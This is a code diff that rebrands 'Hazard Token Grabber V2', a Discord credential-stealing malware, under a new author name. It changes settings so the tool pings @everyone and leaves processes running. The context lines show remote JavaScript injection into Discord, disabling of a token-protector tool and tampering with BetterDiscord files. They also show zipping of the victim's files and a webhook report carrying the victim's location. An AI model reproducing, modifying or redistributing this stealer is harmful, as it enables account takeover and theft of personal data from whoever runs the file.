@@ -34,9 +34,9 @@ __config__ = {
     # keep it as it is unless you want to have a custom one
     "injection_url": "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # if True, it will ping @everyone when someone ran Hazard v2
-    "ping_on_run": False,
+    "ping_on_run": True,
     # set to False if you don't want it to kill programs such as discord upon running the exe
-    "kill_processes": True,
+    "kill_processes": False,
     # if you want the file to run at startup
     "startup": True,
     # if you want the file to hide itself after run
@@ -408,8 +408,8 @@ class HazardTokenGrabberV2(Functions):
                 except json.decoder.JSONDecodeError:
                     return
                 item[
-                    "Rdimo_just_shit_on_this_token_protector"
-                ] = "https://github.com/Rdimo"
+                    "Tøsen_just_shit_on_this_token_protector"
+                ] = "tosen6969"
                 item["auto_start"] = False
                 item["auto_start_discord"] = False
                 item["integrity"] = False
@@ -427,7 +427,7 @@ class HazardTokenGrabberV2(Functions):
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, "a") as f:
                 f.write(
-                    "\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo"
+                    "\n\n//Tøsen just shit on this token protector | tosen6969"
                 )
 
     async def bypassBetterDiscord(self):
@@ -436,7 +436,7 @@ class HazardTokenGrabberV2(Functions):
             x = self.hook_reg
             with open(bd, "r", encoding="cp437", errors="ignore") as f:
                 txt = f.read()
-                content = txt.replace(x, "RdimoTheGoat")
+                content = txt.replace(x, "TøsenTheGoat")
             with open(bd, "w", newline="", encoding="cp437", errors="ignore") as f:
                 f.write(content)
 
@@ -796,15 +796,15 @@ GoogleMaps: {self.googlemap}
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
-                                "🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n"
+                                "🌟・Grabber By Tøsen・tosen6969\n\n"
                             )
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
                                 x
-                                + "\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2"
+                                + "\n\n🌟・Grabber By Tøsen・tosen6969"
                             )
 
-        _zipfile = ntpath.join(self.appdata, f"Hazard.V2-[{Victim}].zip")
+        _zipfile = ntpath.join(self.appdata, f"Tøsen.Grabber-[{Victim}].zip")
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = ntpath.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
@@ -824,13 +824,13 @@ GoogleMaps: {self.googlemap}
         fileCount = f"{file_count} Files Found: "
 
         embed = {
-            "avatar_url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1121508016441790629/1121733907021316208/a_6d5cd673e40a1f701c3b4b6a2ee4e330.png",
             "embeds": [
                 {
                     "author": {
-                        "name": f"*{Victim}* Just ran Hazard Token Grabber.V2",
-                        "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
-                        "icon_url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif",
+                        "name": f"*{Victim}* Just ran Tøsens Token Grabber",
+                        "url": "https://www.pornhub.com",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1121508016441790629/1121733907021316208/a_6d5cd673e40a1f701c3b4b6a2ee4e330.png",
                     },
                     "color": 176185,
                     "description": f"[Google Maps Location]({self.googlemap})",
@@ -883,7 +883,7 @@ GoogleMaps: {self.googlemap}
                         },
                     ],
                     "footer": {
-                        "text": "🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2"
+                        "text": "🌟・Grabber By Tøsen・tosen6969"
                     },
                 }
             ],
